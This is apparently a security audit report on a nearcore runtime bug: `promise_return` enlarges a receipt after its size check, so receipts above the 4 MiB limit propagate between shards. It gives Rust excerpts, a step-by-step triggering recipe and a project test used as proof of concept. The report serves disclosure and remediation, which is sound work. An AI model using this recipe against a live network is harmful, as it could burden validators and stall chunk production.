### Title
Receipt Size Invariant Bypassed via `promise_return` Post-Validation Mutation of `output_data_receivers` — (File: `runtime/runtime/src/lib.rs`)

### Summary

When a contract calls `promise_return(receipt_index)`, the runtime unconditionally extends the returned receipt's `output_data_receivers` with the parent receipt's receivers **after** the receipt has already passed its `NewReceipt` size validation. This allows an unprivileged user to produce an outgoing receipt that exceeds `max_receipt_size` (4,194,304 bytes), bypassing the only enforcement point for that invariant. The oversized receipt is then re-validated with `ExistingReceipt` mode, which explicitly skips the size check, so it propagates through the network unchallenged. The bug is acknowledged in the codebase as issue #12606 but remains unpatched in production files.

### Finding Description

**Step 1 — Receipt creation and initial validation.**
When a contract creates a new receipt C via `promise_batch_create` / `promise_batch_action_function_call`, the VM logic calls `validate_receipt` in `NewReceipt` mode before emitting the receipt. That mode checks:

```rust
if mode == ValidateReceiptMode::NewReceipt {
    let receipt_size: u64 = borsh::object_length(receipt)...;
    if receipt_size > limit_config.max_receipt_size {
        return Err(ReceiptValidationError::ReceiptSizeExceeded { ... });
    }
}
```

A contract can craft C so that its serialized size is exactly `max_receipt_size` (4,194,304 bytes). C passes validation. [1](#0-0) 

**Step 2 — `promise_return` redirects the parent's `output_data_receivers` onto C.**
The parent receipt A was created with a `promise_then` callback B, so A carries a non-empty `output_data_receivers` list (one `DataReceiver` per callback). When A's execution returns `ReturnData::ReceiptIndex(C)`, the runtime in `apply_action_receipt` does:

```rust
ReceiptEnum::Action(new_action_receipt)
| ReceiptEnum::PromiseYield(new_action_receipt) => new_action_receipt
    .output_data_receivers
    .extend_from_slice(&action_receipt.output_data_receivers()),
```

This mutation happens **after** C was validated. No re-validation of C's size is performed. [2](#0-1) 

**Step 3 — The oversized receipt is forwarded without re-checking size.**
After the mutation, C is forwarded via `receipt_sink.forward_or_buffer_receipt`. When it arrives at the destination shard as an incoming receipt, `process_incoming_receipts` validates it with `ExistingReceipt` mode:

```rust
validate_receipt(
    &processing_state.apply_state.config.wasm_config.limit_config,
    receipt,
    protocol_version,
    ValidateReceiptMode::ExistingReceipt,   // ← size check is skipped
)
```

The `ExistingReceipt` mode comment explicitly acknowledges this gap:
> "There is a bug which allows to create receipts that are above the size limit. Runtime has to handle them gracefully until the receipt size limit bug is fixed. See https://github.com/near/nearcore/issues/12606 for details." [3](#0-2) [4](#0-3) 

**Root cause in `ReceiptManager`.**
`create_action_receipt` also pushes `DataReceiver` entries into existing receipts' `output_data_receivers` without any size guard:

```rust
self.action_receipts
    .get_mut(receipt_index as usize)
    .ok_or(HostError::InvalidReceiptIndex { receipt_index })?
    .output_data_receivers
    .push(DataReceiver { data_id: *data_id, receiver_id: receiver_id.clone() });
``` [5](#0-4) 

### Impact Explanation

The `max_receipt_size` invariant is the sole enforcement point preventing receipts from exceeding 4 MiB. Bypassing it allows:

1. **Broken receipt causality invariant**: A receipt that passed `NewReceipt` validation at creation time is silently mutated to a larger size, violating the guarantee that all outgoing receipts satisfy the size limit.
2. **Oversized receipts propagate cross-shard**: The receipt is serialized and sent to another shard's incoming queue. The destination shard processes it under `ExistingReceipt` mode, which skips the size check entirely, so the oversized receipt is executed without rejection.
3. **State witness size pressure**: Oversized receipts inflate the state witness, potentially pushing it past `storage_proof_size_limit` and causing chunk production to stall for legitimate receipts.

The test `test_max_receipt_size_promise_return` explicitly confirms the bug is reachable and that the oversized receipt enters the network: [6](#0-5) 

### Likelihood Explanation

Any unprivileged user who can deploy a contract can trigger this path:

1. Deploy a contract that implements `max_receipt_size_promise_return_method2`-style logic: create a receipt C with args sized to fill `max_receipt_size`, then call `promise_return(C)`.
2. Call that contract from a transaction that uses `promise_then` (so the parent receipt A has a non-empty `output_data_receivers`).
3. When A executes, the runtime extends C's `output_data_receivers` without re-checking size.

No validator or operator privilege is required. The attack is deterministic and reproducible. The test contract `max_receipt_size_promise_return_method2` in the production test-contract crate demonstrates the exact exploit path: [7](#0-6) 

### Recommendation

After the `extend_from_slice` call that appends the parent's `output_data_receivers` to the returned receipt C, re-validate C's serialized size against `max_receipt_size`. If the post-mutation size exceeds the limit, treat the execution as a failure (similar to `NewReceiptValidationError::ReceiptSizeExceeded`) rather than silently forwarding the oversized receipt. The fix should be applied in `apply_action_receipt` in `runtime/runtime/src/lib.rs` immediately after lines 1029–1035.

### Proof of Concept

The existing test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` is a complete proof of concept. It:

1. Deploys the test contract.
2. Calls `max_receipt_size_promise_return_method1`, which creates the promise DAG `A -then-> B`.
3. When A executes, it calls `max_receipt_size_promise_return_method2`, which creates receipt C at exactly `max_receipt_size` and calls `promise_return(C)`.
4. The runtime extends C's `output_data_receivers` with B's receiver, pushing C above `max_receipt_size`.
5. `assert_oversized_receipt_occurred` confirms the oversized receipt entered the network.
6. `assert_test_completed` confirms the callback B was still executed, proving the oversized receipt was processed without rejection. [6](#0-5) [8](#0-7)

// `max_receipt_size`, it'll pass validation, but then `output_data_receivers` will be modified and
// the receipt's size will go above max_receipt_size. The receipt should be rejected, but currently
// isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
// Runtime shouldn't die when it encounters a receipt with size above `max_receipt_size`.
#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
